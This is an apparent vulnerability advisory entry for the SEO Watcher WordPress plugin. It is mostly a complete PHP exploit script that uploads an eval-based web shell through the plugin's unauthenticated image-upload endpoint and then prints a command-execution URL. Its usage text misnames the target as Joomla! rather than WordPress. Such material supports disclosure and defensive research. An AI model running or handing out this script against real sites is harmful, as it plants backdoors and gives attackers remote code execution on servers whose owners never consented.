source: http://www.securityfocus.com/bid/62825/info

The SEO Watcher plugin for WordPress is prone to an arbitrary PHP code-execution vulnerability.

An attacker can exploit this issue to execute arbitrary PHP code within the context of the web server. 

<?php

# seo-watcher ~ Exploit 
# http://indonesiancoder.com/


echo <<<EOT


EOT;


$options = getopt('u:f:');

if(!isset($options['u'], $options['f']))
die("\n        Usage example: php IDC.php -u http://target.com/ -f shell.php\n
-u http://target.com/    The full path to Joomla!
-f shell.php             The name of the file to create.\n");

$url     =  $options['u'];
$file    =  $options['f'];


$shell = "{$url}/wp-content/plugins/seo-watcher/ofc/tmp-upload-images/{$file}";
$url   = "{$url}/wp-content/plugins/seo-watcher/ofc/php-ofc-library/ofc_upload_image.php?name={$file}";

$data      = "<?php eval(\$_GET['cmd']); ?>";
$headers = array('User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Content-Type: text/plain');


echo "        [+] Submitting request to: {$options['u']}\n";


$handle = curl_init();

curl_setopt($handle, CURLOPT_URL, $url);
curl_setopt($handle, CURLOPT_HTTPHEADER, $headers);
curl_setopt($handle, CURLOPT_POSTFIELDS, $data);
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);

$source = curl_exec($handle);
curl_close($handle);


if(!strpos($source, 'Undefined variable: HTTP_RAW_POST_DATA') && @fopen($shell, 'r'))
{
echo "        [+] Exploit completed successfully!\n";
echo "        ______________________________________________\n\n        {$shell}?cmd=system('id');\n";
}
else
{
die("        [+] Exploit was unsuccessful.\n");
}

?>